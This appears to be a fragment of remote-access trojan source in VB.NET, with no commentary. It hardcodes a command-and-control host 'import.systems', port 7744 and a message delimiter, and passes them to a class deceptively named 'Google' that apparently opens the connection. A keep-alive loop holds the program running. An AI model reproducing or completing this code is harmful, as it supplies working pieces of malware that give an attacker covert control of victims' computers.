Imports Microsoft.VisualBasic.CompilerServices
Imports System.Threading

Namespace SN
	Friend Module genr
		Public nx As LogoSN

		Public ReadOnly Property ho As String

		Public ReadOnly Property po As String

		Public ReadOnly Property spl As String

		Sub New()
			genr.ho = "import.systems"
			genr.po = "7744"
			genr.spl = "x0F0x"
		End Sub

        Public Sub ce()
            Try
                Dim google As SN.Google = New SN.Google(New String() {genr.ho, genr.po})
                While True
                    Thread.Sleep(10000)
                End While
            Catch exception As System.Exception
                ProjectData.EndApp()
            End Try
        End Sub
	End Module
End Namespace